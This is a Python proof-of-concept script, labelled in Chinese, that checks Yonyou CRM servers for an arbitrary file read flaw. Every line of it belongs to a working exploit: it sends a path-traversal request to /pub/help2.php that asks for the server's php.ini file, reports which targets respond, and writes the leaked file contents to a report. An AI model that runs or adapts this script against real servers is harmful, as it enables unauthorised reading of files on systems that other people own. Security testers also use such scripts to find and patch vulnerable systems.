import requests
import time
import buter
import wirtefile

info = "用友crm接口任意文件读取"
filename = f"./reps/{info}-"+str(time.strftime("%Y-%m-%d", time.localtime()))
poc = '/pub/help2.php?key=/../../apache/php.ini'
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
    }
def yycrmanyfileread(url):
    try:
        reps = requests.get(url=url+poc, headers=headers, verify=False, timeout=10)
        if reps.status_code == 200 and 'About php.ini' in reps.text:
            print(buter.colors.GREEN+  f"存在{info} url : {url}" + buter.colors.END)
            reptext = reps.url+'\n'+reps.text
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现{info} url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
